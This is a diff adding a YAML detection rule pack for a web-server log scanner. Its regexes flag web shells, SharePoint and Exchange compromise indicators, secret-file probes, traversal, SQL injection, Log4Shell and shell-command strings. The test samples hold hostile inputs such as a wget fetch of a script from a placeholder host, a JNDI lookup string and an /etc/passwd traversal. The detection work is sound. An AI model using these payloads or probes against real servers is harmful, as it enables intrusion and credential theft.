@@ -1,0 +1,252 @@
+# iisguard rule pack. Pack version is in rules/VERSION.
+# CVE ids are only tagged when verified against a primary source (see audit/data/known_fixed_versions.yaml).
+# Every rule needs tests: at least one 'match' and one 'no_match' sample string,
+# evaluated against the rule's own field. All patterns are case-insensitive.
+- id: php2shell-upload-progress
+  category: php2shell
+  score: 100
+  severity: critical
+  field: uri
+  pattern: 'PHP_SESSION_UPLOAD_PROGRESS'
+  description: Upload-progress marker in the request URI/query. php.net lists session upload progress as a confirmed attack path for CVE-2026-109619 and as the CVE-2026-115560 vector (php.net notices 2026-10-21 and 2026-10-23)
+  cve: [CVE-2026-109619, CVE-2026-115560]
+  tests:
+    match:
+      - 'POST /index.php?PHP_SESSION_UPLOAD_PROGRESS=marker 200'
+    no_match:
+      - 'GET /index.php?page=2 200'
+- id: wp-setup-config-probe
+  category: wordpress
+  score: 50
+  severity: medium
+  field: path
+  pattern: '/wp-admin/setup-config\.php'
+  description: Mass probing of WordPress installer
+  tests:
+    match:
+      - '/wp-admin/setup-config.php'
+    no_match:
+      - '/wp-admin/admin-ajax.php'
+- id: wp-upgrade-dir-probe
+  category: wordpress
+  score: 60
+  severity: high
+  field: path
+  pattern: '/wp-content/upgrade(?:/|$)'
+  description: Access to the core-upgrade staging folder. The exact staging path used by CVE-2026-119977 is NOT confirmed by any source read (wp-content/upgrade is a heuristic)
+  tests:
+    match:
+      - '/wp-content/upgrade/wordpress-6/index.php'
+    no_match:
+      - '/wp-content/uploads/2026/11/a.jpg'
+- id: wp-uploads-php
+  category: webshell
+  score: 80
+  severity: high
+  field: path
+  pattern: '/wp-content/uploads/.*\.(?:php\d?|phtml|phar)$'
+  description: Script executed from the WordPress uploads folder
+  tests:
+    match:
+      - '/wp-content/uploads/2026/11/x.php'
+    no_match:
+      - '/wp-content/uploads/2026/11/x.png'
+- id: viewstate-long-get
+  category: viewstate
+  score: 70
+  severity: high
+  field: query
+  pattern: '(?:^|&)__VIEWSTATE=[^&]{1000,}'
+  description: Oversized __VIEWSTATE in a GET query string (deserialization abuse pattern)
+  tests:
+    match:
+      - '__VIEWSTATE=<LONG1000>'
+    no_match:
+      - '__VIEWSTATE=abc&x=1'
+- id: webshell-post-image
+  category: webshell
+  score: 70
+  severity: high
+  field: path
+  methods: [POST]
+  pattern: '\.(?:png|jpe?g|gif|ico|bmp|webp|svg)$'
+  description: POST to an image file (shell masquerading as an image)
+  tests:
+    match:
+      - '/images/logo.png'
+    no_match:
+      - '/api/upload'
+- id: webshell-updatechecker
+  category: webshell
+  score: 90
+  severity: critical
+  field: path
+  pattern: '/updatechecker\.aspx$'
+  description: Known web-shell file name
+  tests:
+    match:
+      - '/UpdateChecker.aspx'
+    no_match:
+      - '/updates/check'
+- id: webshell-double-extension
+  category: webshell
+  score: 90
+  severity: critical
+  field: path
+  pattern: '\.(?:png|jpe?g|gif|ico|bmp)\.(?:aspx?|ashx|php\d?|phtml|jsp)$|\.(?:aspx?|ashx|php\d?|jsp);\.?(?:png|jpe?g|gif)$'
+  description: Script disguised with an image extension
+  tests:
+    match:
+      - '/img/a.png.aspx'
+      - '/img/a.asp;.jpg'
+    no_match:
+      - '/img/a.png'
+- id: webshell-known-name
+  category: webshell
+  score: 50
+  severity: medium
+  field: path
+  pattern: '/(?:c99|r57|wso|b374k|alfa|webshell|indoxploit|filesman|cmd)\.(?:php\d?|aspx?|jsp)$'
+  description: Common web-shell file names
+  tests:
+    match:
+      - '/wp-content/cmd.aspx'
+    no_match:
+      - '/command.php'
+- id: sharepoint-spinstall
+  category: sharepoint
+  score: 100
+  severity: critical
+  field: path
+  pattern: '/_layouts/\d+/spinstall\d*\.aspx'
+  description: Public IOC file name from SharePoint exploitation (CVE-2025-53770 campaign)
+  cve: [CVE-2025-53770]
+  tests:
+    match:
+      - '/_layouts/15/spinstall0.aspx'
+    no_match:
+      - '/_layouts/15/start.aspx'
+- id: sharepoint-toolpane-edit
+  category: sharepoint
+  score: 80
+  severity: high
+  field: uri
+  pattern: '/_layouts/\d+/toolpane\.aspx\?.*displaymode=edit'
+  description: ToolPane.aspx in Edit mode (public IOC from CVE-2025-53770 campaign)
+  cve: [CVE-2025-53770]
+  tests:
+    match:
+      - '/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx'
+    no_match:
+      - '/_layouts/15/start.aspx?DisplayMode=Edit'
+- id: exchange-owa-auth-aspx
+  category: exchange
+  score: 60
+  severity: high
+  field: path
+  pattern: '/owa/auth/[^/]+\.aspx$'
+  exclude: '/owa/auth/(?:logon|errorfe|error|logoff|expiredpassword|redirsuiteservice|frame|getidtoken|outlook|redir|timeout|trace)\.aspx$'
+  description: Unexpected .aspx directly under /owa/auth/ (possible dropped shell)
+  tests:
+    match:
+      - '/owa/auth/shell1.aspx'
+    no_match:
+      - '/owa/auth/logon.aspx'
+- id: sensitive-file-probe
+  category: recon
+  score: 40
+  severity: medium
+  field: path
+  pattern: '/\.env(?:\.[\w-]+)?$|/\.git/(?:config|head)$|/\.svn/entries$|/\.ds_store$|/wp-config\.php(?:\.bak|\.old|\.save|\.orig|\.txt|\.swp|~)$|/web\.config\.(?:bak|old|txt)$|/appsettings(?:\.\w+)?\.json$|/\.aws/credentials$|/id_rsa$'
+  description: Probe for secrets and config backups
+  tests:
+    match:
+      - '/.env'
+      - '/.git/config'
+    no_match:
+      - '/environment.html'
+- id: phpmyadmin-probe
+  category: recon
+  score: 15
+  severity: low
+  field: path
+  pattern: '^/(?:phpmyadmin|pma|myadmin)\d*/'
+  description: Admin-panel discovery
+  tests:
+    match:
+      - '/phpmyadmin/index.php'
+    no_match:
+      - '/blog/pma-guide'
+- id: path-traversal
+  category: exploit
+  score: 50
+  severity: high
+  field: uri
+  pattern: '(?:\.\./|\.\.\\){2,}|/etc/(?:passwd|shadow)|/windows/win\.ini'
+  description: Directory traversal
+  tests:
+    match:
+      - '/download?f=../../../etc/passwd'
+    no_match:
+      - '/docs/../index.html'
+- id: sqli-basic
+  category: exploit
+  score: 40
+  severity: medium
+  field: uri
+  pattern: 'union[\s/*]+(?:all[\s/*]+)?select\s|\bsleep\(\s*\d+\s*\)|\bbenchmark\(|information_schema|waitfor\s+delay|\bor\s+[''"]?1[''"]?\s*=\s*[''"]?1'
+  description: Common SQL-injection fragments
+  tests:
+    match:
+      - '/item?id=1 union select 1,2'
+      - '/item?id=1 or 1=1'
+    no_match:
+      - '/item?id=1&sort=name'
+- id: log4shell-uri
+  category: exploit
+  score: 80
+  severity: high
+  field: uri
+  pattern: '\$\{jndi:'
+  description: JNDI lookup string
+  tests:
+    match:
+      - '/?x=${jndi:ldap://h/a}'
+    no_match:
+      - '/?x=$5'
+- id: rce-command-string
+  category: exploit
+  score: 60
+  severity: high
+  field: uri
+  pattern: '/bin/(?:ba)?sh\b|cmd\.exe|powershell(?:\.exe)?\s+-(?:enc|nop|w)|\b(?:wget|curl)\s+https?://'
+  description: Shell command text in a URL
+  tests:
+    match:
+      - '/?c=wget http://h/x.sh'
+    no_match:
+      - '/blog/curl-tutorial'
+- id: scanner-user-agent
+  category: scanner
+  score: 60
+  severity: medium
+  field: ua
+  pattern: 'sqlmap|nikto|nuclei|masscan|zgrab|acunetix|wpscan|dirbuster|gobuster|feroxbuster|\bffuf\b|wfuzz|openvas|nessus|havij|zmeu|netsparker|\bnmap\b'
+  description: Known scanner user agents
+  tests:
+    match:
+      - 'sqlmap/1.7'
+    no_match:
+      - 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
+- id: php-crash
+  category: php-crash
+  score: 0
+  severity: info
+  field: message
+  pattern: 'PHP (?:Fatal|Parse) error|exited on signal (?:6|11)|SIGSEGV|segfault'
+  description: PHP fatal/crash line; counted for burst detection, not scored per IP
+  tests:
+    match:
+      - 'PHP Fatal error:  Uncaught Error in /var/www/x.php'
+    no_match:
+      - 'PHP Notice:  Undefined variable'
